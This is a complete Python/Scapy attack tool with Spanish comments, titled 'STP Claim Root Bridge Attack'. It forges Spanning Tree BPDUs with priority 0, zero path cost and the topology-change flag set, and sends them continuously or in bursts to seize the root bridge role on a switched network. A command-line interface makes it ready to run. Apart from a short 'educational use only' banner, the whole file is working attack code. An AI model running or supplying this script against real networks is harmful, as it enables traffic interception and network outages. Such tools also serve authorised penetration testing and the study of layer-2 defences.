#!/usr/bin/env python3
"""
STP Claim Root Bridge Attack
Este script envía BPDUs (Bridge Protocol Data Units) falsas con prioridad
baja para reclamar el rol de Root Bridge en la topología STP.
"""

from scapy.all import *
import time

class STPRootAttack:
    def __init__(self, interface="eth0", priority=0, mac_address=None):
        """
        Inicializa el ataque STP Root Bridge
        
        Args:
            interface: Interfaz de red
            priority: Prioridad del bridge (0 = más alta)
            mac_address: MAC del atacante (opcional)
        """
        self.interface = interface
        self.priority = priority
        
        # Obtener MAC de la interfaz si no se proporciona
        if mac_address:
            self.mac_address = mac_address
        else:
            self.mac_address = get_if_hwaddr(interface)
        
        # Convertir MAC a formato numérico para Bridge ID
        self.bridge_id = self.create_bridge_id(priority, self.mac_address)
        
        print(f"[*] Configuración del ataque STP:")
        print(f"    Interfaz: {self.interface}")
        print(f"    MAC: {self.mac_address}")
        print(f"    Prioridad: {self.priority}")
        print(f"    Bridge ID: {self.format_bridge_id(self.bridge_id)}")
    
    def create_bridge_id(self, priority, mac):
        """Crea el Bridge ID combinando prioridad y MAC"""
        # Bridge ID = Priority (2 bytes) + MAC (6 bytes)
        mac_bytes = mac2str(mac)
        priority_bytes = struct.pack("!H", priority)
        return priority_bytes + mac_bytes
    
    def format_bridge_id(self, bridge_id):
        """Formatea Bridge ID para visualización"""
        priority = struct.unpack("!H", bridge_id[:2])[0]
        mac = ":".join(["%02x" % b for b in bridge_id[2:]])
        return f"{priority}.{mac}"
    
    def create_bpdu(self):
        """Crea un paquete BPDU Configuration"""
        # Construir BPDU
        bpdu = (
            Dot3(dst="01:80:c2:00:00:00", src=self.mac_address) /
            LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
            STP(
                proto=0x0000,           # Protocol Identifier
                version=0x00,           # Protocol Version (STP)
                bpdutype=0x00,          # BPDU Type (Configuration)
                bpduflags=0x01,         # TC flag
                rootid=self.priority,   # Root Bridge ID (prioridad)
                rootmac=self.mac_address,  # Root Bridge MAC
                pathcost=0,             # Root Path Cost (0 = somos root)
                bridgeid=self.priority, # Bridge ID (prioridad)
                bridgemac=self.mac_address,  # Bridge MAC
                portid=0x8001,          # Port ID
                age=0.0,                # Message Age
                maxage=20.0,            # Max Age
                hellotime=2.0,          # Hello Time
                fwddelay=15.0           # Forward Delay
            )
        )
        
        return bpdu
    
    def send_bpdu_continuous(self, interval=2, count=None):
        """
        Envía BPDUs continuamente
        
        Args:
            interval: Intervalo entre BPDUs en segundos
            count: Número de BPDUs a enviar (None = infinito)
        """
        print(f"\n[*] Enviando BPDUs cada {interval} segundos...")
        print("[!] Presione Ctrl+C para detener\n")
        
        sent = 0
        try:
            while count is None or sent < count:
                bpdu = self.create_bpdu()
                sendp(bpdu, iface=self.interface, verbose=False)
                sent += 1
                
                print(f"[+] BPDU #{sent} enviada - Reclamando Root Bridge (Prioridad: {self.priority})")
                
                time.sleep(interval)
        
        except KeyboardInterrupt:
            print(f"\n[!] Detenido después de {sent} BPDUs enviadas")
    
    def send_bpdu_burst(self, count=10, delay=0.1):
        """
        Envía un burst de BPDUs
        
        Args:
            count: Número de BPDUs a enviar
            delay: Retardo entre BPDUs
        """
        print(f"\n[*] Enviando burst de {count} BPDUs...")
        
        for i in range(count):
            bpdu = self.create_bpdu()
            sendp(bpdu, iface=self.interface, verbose=False)
            print(f"[+] BPDU {i+1}/{count} enviada")
            
            if i < count - 1:
                time.sleep(delay)
        
        print(f"[✓] Burst completado: {count} BPDUs enviadas")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(
        description="STP Claim Root Bridge Attack - Reclama el rol de Root Bridge"
    )
    parser.add_argument(
        "-i", "--interface",
        default="eth0",
        help="Interfaz de red (default: eth0)"
    )
    parser.add_argument(
        "-p", "--priority",
        type=int,
        default=0,
        help="Prioridad del bridge (default: 0 = más alta)"
    )
    parser.add_argument(
        "-m", "--mac",
        help="Dirección MAC del atacante (default: MAC de la interfaz)"
    )
    parser.add_argument(
        "-t", "--interval",
        type=int,
        default=2,
        help="Intervalo entre BPDUs en segundos (default: 2)"
    )
    parser.add_argument(
        "-c", "--count",
        type=int,
        help="Número de BPDUs a enviar (default: infinito)"
    )
    parser.add_argument(
        "-b", "--burst",
        action="store_true",
        help="Enviar un burst único en lugar de continuo"
    )
    parser.add_argument(
        "--burst-count",
        type=int,
        default=10,
        help="Número de BPDUs en el burst (default: 10)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("STP CLAIM ROOT BRIDGE ATTACK")
    print("=" * 60)
    print("ADVERTENCIA: Este script es solo para fines educativos")
    print("Úselo solo en redes de prueba autorizadas")
    print("Puede causar loops de red y caída del switch")
    print("=" * 60)
    
    try:
        attacker = STPRootAttack(
            interface=args.interface,
            priority=args.priority,
            mac_address=args.mac
        )
        
        if args.burst:
            attacker.send_bpdu_burst(count=args.burst_count)
        else:
            attacker.send_bpdu_continuous(
                interval=args.interval,
                count=args.count
            )
    
    except KeyboardInterrupt:
        print("\n[!] Ataque interrumpido por el usuario")
    except PermissionError:
        print("[ERROR] Se requieren privilegios de root para enviar paquetes")
        print("Ejecute el script con sudo")
    except Exception as e:
        print(f"[ERROR] {e}")
        import traceback
        traceback.print_exc()